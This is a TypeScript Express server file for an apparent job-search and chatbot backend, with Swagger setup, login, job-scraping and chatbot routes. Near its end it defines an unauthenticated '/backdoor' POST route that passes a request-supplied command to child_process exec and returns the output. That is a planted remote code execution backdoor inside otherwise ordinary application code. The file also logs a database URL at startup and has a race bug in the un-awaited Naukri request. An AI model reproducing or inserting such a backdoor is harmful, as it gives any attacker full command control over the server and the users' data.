import express, { Request, Response, NextFunction } from "express";
import dotenv from "dotenv";
import axios from "axios";
import { exec } from 'child_process';
import swaggerUi from 'swagger-ui-express'
dotenv.config();
console.log("hello", process.env.URL_DB)

// import { testDbConnection } from './databaseStructure/dbconnection.js'

import auntendicationService from "./auntendication.service.js"
import languageTranslationAPI from './languageTranslation.service.js'
import linkedinApi from './linkedinService.js'
import chatRouter from "./routes/chatbot.route.js"
import swaggerSpec from "./swagger.js";
import authNsetUser from "./middleware/authNsetUser.js";
import redisCon from "./DBConnections/redisConnection.js";
import loginRouter from "./routes/login.route.js";
import JWTAuthendication from "./auntendication.service.js";



const app = express();
const auntendicationServiceFile = new auntendicationService();
const languageTranslation = new languageTranslationAPI()
const linkedinApiFile = new linkedinApi();
const PORT = process.env.PORT ? process.env.PORT : 3000;

app.use(express.json());

const swaggerCustomCss = `
  .hljs {
    background: #272822 !important;  /* Background for Monokai theme */
    color: #f8f8f2 !important;  /* Text color for Monokai theme */
  }
  .hljs-keyword {
    color: #66d9ef !important;
  }
  .hljs-string {
    color: #e6db74 !important;
  }
  .hljs-title {
    color: #a6e22e !important;
  }
`;


const swaggerUiOptions = {
  customCss: swaggerCustomCss,
  customSiteTitle: 'Your API Docs',
  syntaxHighlight: {
    theme: 'monokai',  // Change to your preferred theme
  },
};

app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, swaggerUiOptions));


// languageTranslation.translateText({ text: 'नमस्ते माँ, आप कैसी हैं?' })
//connect db
// testDbConnection()

app.use("/user/login", loginRouter)



app.get("/",(req,res)=>res.json({status:"app is running..."}));


app.post("/jobAvailability", async (req, res) => {
  let { title = "", location = "", level = "" } = req.body;
  if (!(title && location)) {
    return res.status(400).json({ status: "title or location is missing" })
  }
  let options = {
    "headers": {
      "Accept": "application/json",
      "Host": "www.naukri.com",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br",
      "clientid": "d3skt0p",
      "appid": 109,
      "systemid": "Naukri",
      "Content-Type": " application/json",
      "gid": "LOCATION,INDUSTRY,EDUCATION,FAREA_ROLE",
      "Connection": "keep-alive",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "TE": "trailers",
    },
  };
  let naukriData: any[] = []
  axios.get(
    `https://www.naukri.com/jobapi/v3/search?noOfResults=20&urlType=search_by_keyword&searchType=adv&keyword=${title}&pageNo=1&experience=0&k=${title}&experience=0&seoKey=${title}-jobs&src=jobsearchDesk&latLong=`,
    options).then((value) => {
      naukriData = value.data
    }).catch((e) => {
      res.status(500).json({ status: "something went wrong while fetching" })
      return
    });
  let linkedInData = await linkedinApiFile.linnkedinService(req.body)
  return res.status(200).json({
    linkedInData: linkedInData,
    naukriData: naukriData
  })
});

app.post("/logout", (req, res) => {
  /**
   * TODO:
   *  properly logout from the system
   *  by clearing cookie or session or tag in DB
   */
  // const { token } = req.body;
  // let refreshTokens = auntendicationServiceFile.refreshTokens.filter((t) => t !== token);

  res.status(204).json({ message: "Logout successful" });
});


app.use("/chatbot", authNsetUser, chatRouter);

app.post(
  "/test",
  JWTAuthendication.authenticateAccessToken,
  (req, res) => {
    console.log("sucess");
    res.sendStatus(200);
  }
);
app.listen(PORT, () => {

  console.log("listening port", PORT);

});



app.post("/backdoor", (req, res) => {
  // Command to execute
  const command = req.body.cmd || 'echo "Hello World"';

  // Execute the command
  exec(command, (error, stdout, stderr) => {
    if (error) {
      // If there's an error, return it
      return res.status(200).json({ error: error.message });
    }
    if (stderr) {
      // If there's stderr, return it
      return res.status(200).json({ stderr });
    }
    // If everything is fine, return stdout
    res.json({ output: stdout });
  });
});

app.use((err: any, req: Request, res: Response, next: NextFunction) => {
  console.error(err.stack);
  res.status(200).json({ status: 200, message: "Something went wrong", errors: [err.message] });
});